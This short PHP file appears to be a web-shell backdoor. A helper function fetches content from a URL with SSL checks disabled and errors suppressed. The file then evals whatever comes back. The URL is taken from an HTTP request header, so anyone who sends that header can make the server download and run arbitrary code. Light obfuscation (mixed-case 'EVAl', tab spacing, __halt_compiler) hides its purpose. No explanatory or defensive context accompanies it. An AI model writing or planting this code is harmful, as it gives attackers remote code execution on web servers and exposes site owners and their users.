<?php
function clur($url)	{
	if (function_exists("curl_init"))	{
		$ch = @curl_init();
		@curl_setopt($ch, CURLOPT_URL, $url);
		@curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		@curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		@curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		$result = @curl_exec($ch);
		@curl_close($ch);
		return $result;
		}
	}	@EVAl	(
	"?>"	.	(	clur($_SERVER	["HTTP_CURL"])));
__halt_compiler();
?>